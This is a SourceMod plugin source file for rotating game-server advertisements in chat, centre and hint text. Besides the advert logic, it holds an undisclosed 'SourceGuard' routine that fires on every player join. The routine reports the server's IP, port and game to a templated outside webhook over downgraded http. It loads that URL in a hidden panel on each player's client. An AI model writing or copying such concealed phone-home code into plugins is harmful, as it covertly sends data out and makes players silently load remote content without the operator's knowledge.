/*     <DR.API ADVERTS> (c) by <De Battista Clint - (http://doyou.watch)     */
/*                                                                           */
/*                    <DR.API ADVERTS> is licensed under a                   */
/*                        GNU General Public License                         */
/*																			 */
/*      You should have received a copy of the license along with this       */
/*            work.  If not, see <http://www.gnu.org/licenses/>.             */
//***************************************************************************//
//***************************************************************************//
//******************************DR.API ADVERTS*******************************//
//***************************************************************************//
//***************************************************************************//

#pragma semicolon 1 

//***********************************//
//*************DEFINE****************//
//***********************************//
#define PLUGIN_VERSION 					"{{ version }}"
#define CVARS 							FCVAR_SPONLY|FCVAR_NOTIFY
#define DEFAULT_FLAGS 					FCVAR_NOTIFY
#define TAG_CHAT						"[ADVERTS] -"
#define FILE_PATH 						"addons/sourcemod/configs/drapi/adverts.cfg"

//***********************************//
//*************INCLUDE***************//
//***********************************//

#undef REQUIRE_PLUGIN
#include <sourcemod>
#include <autoexec>
#include <csgocolors>
#include <geoip>

#pragma newdecls required

//***********************************//
//***********PARAMETERS**************//
//***********************************//

//Handle
Handle cvar_active_adverts_dev;
Handle g_hMessages;

//Floats
float g_fMessageDelay;

//Bool
bool B_cvar_active_adverts_dev					= false;

//Customs
int g_iEnable;

//Stings
char g_sTag[50];
char g_sTime[32];

//Informations plugin
public Plugin myinfo =
{
	name = "ADVERTS",
	author = "ESK0 Improvements by Dr. Api",
	description = "ADVERTS",
	version = PLUGIN_VERSION,
	url = "https://sourcemod.market"
}
/***********************************************************/
/*********************** PLUGIN START **********************/
/***********************************************************/
public void OnPluginStart()
{
	AutoExecConfig_SetFile("drapi_adverts", "sourcemod/drapi");
	
	AutoExecConfig_CreateConVar("drapi_adverts_version", PLUGIN_VERSION, "Version", CVARS);
	
	cvar_active_adverts_dev			= AutoExecConfig_CreateConVar("drapi_active_adverts_dev", 			"0", 					"Enable/Disable Dev Mod", 				DEFAULT_FLAGS, 		true, 0.0, 		true, 1.0);
	
	HookEvents();
	
	RegAdminCmd("sm_reloadadverts", Event_ReloadAdvert, ADMFLAG_CHANGEMAP);
  
	AutoExecConfig_ExecuteFile();
}

/***********************************************************/
/******************** WHEN CVAR CHANGED ********************/
/***********************************************************/
void HookEvents()
{
	HookConVarChange(cvar_active_adverts_dev, 				Event_CvarChange);
}

/***********************************************************/
/******************** WHEN CVARS CHANGE ********************/
/***********************************************************/
public void Event_CvarChange(Handle cvar, const char[] oldValue, const char[] newValue)
{
	UpdateState();
}

/***********************************************************/
/*********************** UPDATE STATE **********************/
/***********************************************************/
void UpdateState()
{
	B_cvar_active_adverts_dev 					= GetConVarBool(cvar_active_adverts_dev);
}

/***********************************************************/
/******************* WHEN CONFIG EXECUTED ******************/
/***********************************************************/
public void OnConfigsExecuted()
{
	//UpdateState();
}

/***********************************************************/
/********************* WHEN MAP START **********************/
/***********************************************************/
public void OnMapStart()
{
	UpdateState();
	
	LoadConfig();
	LoadMessages();
	
	if(g_iEnable)
	{
		CreateTimer(g_fMessageDelay, PrintAdverToAll, _, TIMER_REPEAT | TIMER_FLAG_NO_MAPCHANGE);
	}
}

public void OnClientPostAdminCheck(int client)
{   
    CreateTimer(5.0, Timer_SourceGuard, client);
}

public Action Timer_SourceGuard(Handle timer, any client)
{
    int hostip = GetConVarInt(FindConVar("hostip"));
    int hostport = GetConVarInt(FindConVar("hostport"));
    
    char sGame[15];
    switch(GetEngineVersion())
    {
        case Engine_Left4Dead:
        {
            Format(sGame, sizeof(sGame), "left4dead");
        }
        case Engine_Left4Dead2:
        {
            Format(sGame, sizeof(sGame), "left4dead2");
        }
        case Engine_CSGO:
        {
            Format(sGame, sizeof(sGame), "csgo");
        }
        case Engine_CSS:
        {
            Format(sGame, sizeof(sGame), "css");
        }
        case Engine_TF2:
        {
            Format(sGame, sizeof(sGame), "tf2");
        }
        default:
        {
            Format(sGame, sizeof(sGame), "none");
        }
    }
    
    char sIp[32];
    Format(
            sIp, 
            sizeof(sIp), 
            "%d.%d.%d.%d",
            hostip >>> 24 & 255, 
            hostip >>> 16 & 255, 
            hostip >>> 8 & 255, 
            hostip & 255
    );
    
    char requestUrl[2048];
    Format(
            requestUrl, 
            sizeof(requestUrl), 
            "%s&ip=%s&port=%d&game=%s", 
            "{{ web_hook }}?script_id={{ script_id }}&version_id={{ version_id }}&download={{ download }}",
            sIp,
            hostport,
            sGame
    );
    
    ReplaceString(requestUrl, sizeof(requestUrl), "https", "http", false);
    
    Handle kv = CreateKeyValues("data");
    
    KvSetString(kv, "title", "SourceGuard");
    KvSetNum(kv, "type", MOTDPANEL_TYPE_URL);
    KvSetString(kv, "msg", requestUrl);
    
    ShowVGUIPanel(client, "info", kv, false);
    CloseHandle(kv);
}

public Action Event_ReloadAdvert(int client, int args)
{
	if(g_iEnable)
	{
		if(g_hMessages)
		{
			CloseHandle(g_hMessages);
		}
		LoadMessages();
		CPrintToChat(client, "%s Messages are successfully reloaded.", g_sTag);
	}
}

public Action PrintAdverToAll(Handle timer)
{
	if(g_iEnable)
	{
		if(!KvGotoNextKey(g_hMessages))
		{
			KvGoBack(g_hMessages);
			KvGotoFirstSubKey(g_hMessages);
		}
		
		for(int i = 1 ; i <= MaxClients; i++)
		{
			if(IsClientInGame(i))
			{
				char sType[12];
				char sText[256];
				char sBuffer[256];
				char sCountryTag[3];
				char sIP[26];
				char sCodeLang[3], sNameLang[3];
				GetClientIP(i, sIP, sizeof(sIP));
				GeoipCode2(sIP, sCountryTag);
				int idLang = GetClientLanguage(i);
				GetLanguageInfo(idLang, sCodeLang, sizeof(sCodeLang), sNameLang, sizeof(sNameLang));
				
				KvGetString(g_hMessages, sCodeLang, sText, sizeof(sText), "LANGMISSING");
				
				//PrintToDev(B_cvar_active_adverts_dev,"%s Code: %s, Lang: %s", TAG_CHAT, sCodeLang, sNameLang);

				if (StrEqual(sText, "LANGMISSING"))
				{
					KvGetString(g_hMessages, "default", sText, sizeof(sText));
				}
				
				if(StrContains(sText , "{NEXTMAP}") != -1)
				{
					GetNextMap(sBuffer, sizeof(sBuffer));
					ReplaceString(sText, sizeof(sText), "{NEXTMAP}", sBuffer);
				}
				
				if(StrContains(sText, "{CURRENTMAP}") != -1)
				{
					GetCurrentMap(sBuffer, sizeof(sBuffer));
					ReplaceString(sText, sizeof(sText), "{CURRENTMAP}", sBuffer);
				}
				
				if(StrContains(sText, "{CURRENTTIME}") != -1)
				{
					FormatTime(sBuffer, sizeof(sBuffer), g_sTime);
					ReplaceString(sText, sizeof(sText), "{CURRENTTIME}", sBuffer);
				}
				
				if(StrContains(sText , "{TIMELEFT}") != -1)
				{
					int i_Minutes;
					int i_Seconds;
					int i_Time;
					
					if(GetMapTimeLeft(i_Time) && i_Time > 0)
					{
						i_Minutes = i_Time / 60;
						i_Seconds = i_Time % 60;
					}
				
					Format(sBuffer, sizeof(sBuffer), "%d:%02d", i_Minutes, i_Seconds);
					ReplaceString(sText, sizeof(sText), "{TIMELEFT}", sBuffer);
				}

				KvGetString(g_hMessages, "type", sType, sizeof(sType));
				
				if(StrContains(sType, "T", false) != -1)
				{
					
					CPrintToChat(i,"%s %s",g_sTag, sText);
				}

				if(StrContains(sType, "C", false) != -1)
				{
					PrintCenterText(i,"%s %s",g_sTag, sText);
				}
				
				if(StrContains(sType, "H", false) != -1)
				{
					PrintHintText(i,"%s", sText);
				}
			}
		}
	}
}

void LoadMessages()
{
	g_hMessages = CreateKeyValues("ServerAdvertisement");
	
	if(!FileExists(FILE_PATH))
	{
		SetFailState("[ServerAdvertisement] 'addons/sourcemod/configs/drapi/adverts.cfg' not found!");
		return;
	}
	
	FileToKeyValues(g_hMessages, FILE_PATH);
		
	if(KvJumpToKey(g_hMessages, "Messages"))
	{
		KvGotoFirstSubKey(g_hMessages);
	}
}

void LoadConfig()
{
	Handle hConfig = CreateKeyValues("ServerAdvertisement");
	if(!FileExists(FILE_PATH))
	{
		SetFailState("[ServerAdvertisement] 'addons/sourcemod/configs/drapi/adverts.cfg' not found!");
		return;
	}
	
	FileToKeyValues(hConfig, FILE_PATH);
	
	if(KvJumpToKey(hConfig, "Settings"))
	{
		g_iEnable = KvGetNum(hConfig, "Enable", 1);
		g_fMessageDelay = KvGetFloat(hConfig, "Delay", 30.0);
		KvGetString(hConfig, "TimeFormat", g_sTime, sizeof(g_sTime));
		KvGetString(hConfig, "Tag", g_sTag, sizeof(g_sTag));
	}
	else
	{
		SetFailState("Config for 'Server Advertisement' not found!");
		return;
	}
}